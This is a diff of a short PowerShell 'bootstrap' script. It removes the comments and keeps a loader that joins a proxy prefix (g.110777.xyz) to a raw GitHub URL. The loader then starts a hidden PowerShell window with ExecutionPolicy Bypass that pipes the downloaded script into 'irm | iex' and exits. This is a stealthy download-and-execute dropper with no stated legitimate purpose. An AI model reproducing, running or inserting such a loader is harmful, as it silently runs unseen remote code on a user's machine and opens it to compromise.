@@ -1,17 +1,8 @@
-# 放在 mas.110777.xyz 的引导脚本
-
-# 1. 定义原始部署脚本地址和加速站前缀
+# 引导脚本
 $原始部署脚本链接 = "https://raw.githubusercontent.com/royckk/RE2/refs/heads/main/bbb"
 $加速站前缀 = "https://g.110777.xyz/"
-
-# 2. 组合成加速后的链接
 $后台脚本URL = $加速站前缀 + $原始部署脚本链接
-
 $隐藏窗口参数 = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -Command"
-
-# 启动一个完全隐藏的PowerShell窗口来执行真正的部署脚本
 $启动命令 = "`"irm -Uri '$后台脚本URL' -UseBasicParsing | iex`""
 Start-Process powershell.exe -ArgumentList "$隐藏窗口参数 $启动命令" -WindowStyle Hidden
-
-# 引导脚本自身立即退出
 exit 0
